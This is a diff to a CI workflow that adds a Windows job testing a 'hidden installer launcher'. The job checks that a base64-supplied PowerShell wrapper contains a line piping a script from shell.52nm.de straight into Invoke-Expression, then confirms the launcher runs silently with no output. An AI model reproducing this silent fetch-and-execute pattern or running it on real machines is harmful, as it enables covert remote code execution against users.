@@ -17,6 +17,11 @@ on:
         type: boolean
         required: false
         default: false
+      quiet_smoke:
+        description: 'Verify the hidden installer launcher without registering a real device'
+        type: boolean
+        required: false
+        default: false
       installer_source:
         description: 'Base64-encoded candidate installer for the isolated Windows test'
         type: string
@@ -78,7 +83,7 @@ jobs:
           retention-days: 14
 
   nas-installer:
-    if: inputs.installer_sha256 != ''
+    if: inputs.installer_sha256 != '' && !inputs.quiet_smoke
     runs-on: windows-11-arm
     timeout-minutes: 10
     steps:
@@ -186,3 +191,34 @@ jobs:
               if ($LASTEXITCODE -ne 0) { throw 'Legacy smoke-test service cleanup failed.' }
             }
           }
+
+
+  quiet-installer:
+    if: inputs.quiet_smoke
+    runs-on: windows-11-arm
+    timeout-minutes: 5
+    steps:
+      - name: Verify hidden process and exit code in Windows PowerShell
+        shell: powershell
+        env:
+          EXPECTED_SHA: ${{ inputs.installer_sha256 }}
+          QUIET_SOURCE: ${{ inputs.installer_source }}
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $path = Join-Path $env:RUNNER_TEMP 'quiet.ps1'
+          [IO.File]::WriteAllBytes($path, [Convert]::FromBase64String($env:QUIET_SOURCE))
+          if ((Get-FileHash -LiteralPath $path).Hash -ne $env:EXPECTED_SHA) { throw 'Unexpected wrapper' }
+          $source = Get-Content -LiteralPath $path -Raw
+          $expected = 'irm https://shell.52nm.de:5443/sx/v.ps1 | iex; exit 0'
+          if (!$source.Contains($expected)) { throw 'Unexpected installer target' }
+          foreach ($case in @(
+            @{ Command = '[Console]::WriteLine("stdout"); [Console]::Error.WriteLine("stderr"); exit 0'; Code = 0 },
+            @{ Command = 'throw "synthetic failure"'; Code = 1 }
+          )) {
+            $script = $source.Replace($expected, $case.Command.Replace("'", "''"))
+            $output = @(Invoke-Expression $script *>&1)
+            if ($output.Count -ne 0 -or $LASTEXITCODE -ne $case.Code) {
+              throw "Quiet launcher returned $($output.Count) output records and exit code $LASTEXITCODE."
+            }
+          }
+          Write-Host 'Hidden child launched, quiet output and success/failure exit codes verified.'
